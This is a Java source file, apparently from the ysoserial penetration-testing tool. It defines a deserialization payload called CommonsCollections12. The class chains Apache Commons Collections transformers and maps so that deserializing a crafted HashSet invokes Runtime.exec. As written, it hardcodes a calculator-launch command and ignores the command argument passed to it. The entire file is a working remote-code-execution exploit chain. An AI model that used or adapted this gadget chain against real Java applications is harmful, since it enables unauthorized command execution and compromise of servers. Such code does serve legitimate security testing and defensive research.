package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

@PayloadTest( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.2.1"})
public class CommonsCollections12 extends PayloadRunner implements ObjectPayload<HashSet>  {

    @Override
    public HashSet getObject(String... command) throws Exception {
        ConstantTransformer constantTransformer3 = new ConstantTransformer(1);
        Map innerMap3 = TransformedMap.decorate(new HashMap(), null, constantTransformer3);

        Transformer invokerTransformer2 = new InvokerTransformer("exec", new Class[]{String[].class}, new Object[] {new String[] {"open", "-a", "calculator"}});
        Map innerMap2 = TransformedMap.decorate(innerMap3, null, invokerTransformer2);

        Transformer invokerTransformer1 = new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] });
        Map innerMap = TransformedMap.decorate(innerMap2, null, invokerTransformer1);

        Transformer invokerTransformer = new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] });
        final Map map = LazyMap.decorate(innerMap, invokerTransformer);

        TiedMapEntry entry = new TiedMapEntry(map, Runtime.class);

        HashSet evil = new HashSet(1);
        evil.add("foo");
        Field f;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        Reflections.setAccessible(f);
        HashMap innimpl;
        innimpl = (HashMap) f.get(evil);

        Field f2;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Reflections.setFieldValue(node, "key", entry);
        return evil;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections12.class, args);
    }
}
